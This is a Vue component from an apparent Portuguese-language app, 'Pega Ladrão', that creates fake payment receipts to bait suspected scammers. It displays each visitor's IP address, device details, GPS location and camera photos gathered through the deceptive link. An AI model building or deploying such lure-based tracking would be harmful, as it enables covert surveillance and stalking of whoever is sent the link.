<script setup>
import { onBeforeMount, onMounted, reactive } from 'vue';
import { useRoute, useRouter } from 'vue-router';
import { firestore, storage } from '../firebase';
import { collection, doc, getDoc, getDocs, orderBy, query, where } from 'firebase/firestore';
import { useAppStore } from '../store';
import { alertMessage, copyToClipboard, formataDataHoraPtBr } from '../functions';
import { getDownloadURL, listAll, ref } from 'firebase/storage';

const route = useRoute();
const router = useRouter();

const VITE_DEFAULT_COMPROVANTE_URL = import.meta.env.VITE_DEFAULT_COMPROVANTE_URL;

const appStore = useAppStore();

const data = reactive({
    alert: null,
    comprovante: null,
    acessos: [],
    fotos: [],
    expiracaoContagem: '',
});

onBeforeMount(() => {
    appStore.loadingToggle();
});

onMounted(async () => {
    if (!route.query.id) {
        router.push({ path: '/' });
    }

    const docRef = doc(firestore, 'comprovantes', route.query.id);
    const docSnap = await getDoc(docRef);

    if (!docSnap.exists()) {
        data.alert = alertMessage('danger', 'Comprovante não existe!');
        appStore.loadingToggle();
        return;
    } else {
        if (docSnap.data().expiracao.toDate() > (new Date)) {
            data.comprovante = docSnap.data();
            data.comprovante.id = docSnap.id;
        } else {
            appStore.loadingToggle();
            data.alert = alertMessage('danger', 'Comprovante não existe!');
            return;
        }
    }

    await getFotos(route.query.id);
    await queryAcessos(route.query.id);

    const expiracao = data.comprovante.expiracao.toDate().getTime();
    let x = setInterval(() => {
        const now = new Date().getTime();
        let distance = expiracao - now;

        // let d = Math.floor(distance / (1000 * 60 * 60 * 24));
        let h = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        let m = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        let s = Math.floor((distance % (1000 * 60)) / 1000);

        data.expiracaoContagem = `Comprovante Expira em: ${h}h ${m}m ${s}s`;

        if (distance < 0) {
            clearInterval(x);
            data.comprovante = null;
            data.expiracaoContagem = 'Comprovante Expirado!';
        }
    }, 1000)

    appStore.loadingToggle();

    // POLLING A CADA 30 SEGUNDOS
    window.setInterval(async () => {
        appStore.loadingToggle();
        await getFotos(route.query.id);
        await queryAcessos(route.query.id);
        appStore.loadingToggle();
    }, 30 * 1000);
});

async function queryAcessos(comprovanteId) {
    data.acessos = [];
    const q = query(collection(firestore, "acessos"), where("comprovanteId", "==", comprovanteId), orderBy('at', 'desc'));
    const querySnapshot = await getDocs(q);
    querySnapshot.forEach((doc) => {
        let acesso = { ...doc.data() };
        acesso.id = doc.id;
        data.acessos.push(acesso);
    });
}

async function getFotos(comprovanteId) {
    data.fotos = [];
    const listRef = ref(storage, `capturas/${comprovanteId}`);
    await listAll(listRef)
        .then(acessos => {
            acessos.prefixes.forEach((acessosRef) => {
                data.fotos[acessosRef.name] = [];
                listAll(acessosRef)
                    .then(fotos => {
                        fotos.items.forEach(fotoRef => {
                            getDownloadURL(fotoRef)
                                .then((url) => {
                                    data.fotos[acessosRef.name].push(url);
                                })
                                .catch(erro => console.error('Erro:', erro))
                        })
                    })
            });
        }).catch((error) => {
            data.alert = alertMessage('danger', `Erro: ${error.message}`);
        });
}
</script>

<template>
    <nav class="navbar mb-3" style="background-color: lightgray;">
        <div class="container-fluid">
            <span class="navbar-brand">Pega Ladrão</span>
            <RouterLink :to="{ name: 'gerar' }" class="btn btn-danger">Gerar Novo Comprovante</RouterLink>
        </div>
    </nav>

    <div class="container">

        <div v-if="data.alert" :class="`alert alert-${data.alert.class} alert-dismissible fade show mb-3`" role="alert">
            {{ data.alert.message }}
            <button @click="data.alert = null" type="button" class="btn-close" data-bs-dismiss="alert"
                aria-label="Close"></button>
        </div>

        <div v-if="data.comprovante" class="alert alert-success text-center" role="alert">
            <h4 class="alert-heading" style="font-weight: bold;">
                🎉 Comprovante gerado com sucesso! 🎉
            </h4>
            <p><b>ID: {{ data.comprovante?.id }}</b></p>
            <p>
                Agora basta copiar o link do comprovante fake e enviar para o
                <span style="text-decoration: line-through">meliante</span>
                cidadão de bem e aguardar ele acessar. Todos os acessos registrados (Informações, localização e fotos)
                serão listados logo abaixo na seção de <i>Acessos</i>.
            </p>
            <hr>
            <p class="mb-0">
                {{ VITE_DEFAULT_COMPROVANTE_URL }}/transacao?id={{ data.comprovante?.id }}<br><br>
                <button @click="copyToClipboard(`${VITE_DEFAULT_COMPROVANTE_URL}/transacao?id=${data.comprovante.id}`)"
                    type="button" class="btn btn-info">
                    Copiar Link 📋
                </button>
            </p>
        </div>

        <h2>Acessos</h2>
        <h3 style="color: red;">{{ data.expiracaoContagem }}</h3>
        <hr>
        <div class="accordion mb-3" id="accordionFlush">
            <div v-for="(acesso, index) in data.acessos" class="accordion-item">
                <h2 class="accordion-header">
                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
                        :data-bs-target="'#item' + index" aria-expanded="false" :aria-controls="'item' + index">
                        {{ index + 1 }}. {{ formataDataHoraPtBr(acesso.at.toDate()) }}
                    </button>
                </h2>
                <div :id="'item' + index" class="accordion-collapse collapse" data-bs-parent="#accordionFlush">
                    <div class="accordion-body">
                        <p>
                            <b>ID:</b> {{ acesso.id }} <br>
                            <b>Data e Hora:</b> {{ formataDataHoraPtBr(acesso.at.toDate()) }} <br>
                            <span style="color: red;"><b>IP publico:</b> {{ acesso.publicIp }}</span>
                        </p>
                        <h5>Informações do Dispositivo</h5>
                        <hr>
                        <p>
                            <b>deviceId: </b> {{ acesso.deviceId }} <br>
                            <b>manufacturer: </b> {{ acesso.manufacturer }} <br>
                            <b>model: </b> {{ acesso.model }} <br>
                            <b>operatingSystem: </b> {{ acesso.operatingSystem }} <br>
                            <b>osVersion: </b> {{ acesso.osVersion }} <br>
                            <b>platform: </b> {{ acesso.platform }} <br>
                            <b>webViewVersion: </b> {{ acesso.webViewVersion }}
                        </p>
                        <h5>Localização</h5>
                        <hr>
                        <p v-if="acesso.latitude && acesso.longitude">
                            <b>Precisão: </b> {{ acesso.accuracy }} <br>
                            <b>Latitude: </b> {{ acesso.latitude }} <br>
                            <b>Longitude: </b> {{ acesso.longitude }} <br><br>
                            <iframe
                                :src="`https://maps.google.com/maps?q=${acesso.latitude},${acesso.longitude}&z=15&output=embed`"
                                frameborder="1" style="width: 100%; height: 300px;"></iframe>
                        </p>
                        <div v-else class="alert alert-danger text-center" role="alert">
                            Permissão de localização foi negada.
                        </div>
                        <h5 v-if="data.fotos[acesso.id] !== undefined" class="text-center">Fotos</h5>
                        <div v-if="data.fotos[acesso.id] !== undefined" id="carouselFotos" class="carousel slide"
                            data-bs-ride="carousel">
                            <div class="carousel-inner">
                                <div v-for="foto in data.fotos[acesso.id]" class="carousel-item active">
                                    <img :src="foto" class="d-block w-100">
                                </div>
                            </div>
                            <button class="carousel-control-prev" type="button" data-bs-target="#carouselFotos"
                                data-bs-slide="prev">
                                <span class="carousel-control-prev-icon" aria-hidden="true"></span>
                                <span class="visually-hidden">Previous</span>
                            </button>
                            <button class="carousel-control-next" type="button" data-bs-target="#carouselFotos"
                                data-bs-slide="next">
                                <span class="carousel-control-next-icon" aria-hidden="true"></span>
                                <span class="visually-hidden">Next</span>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</template>

<style scoped></style>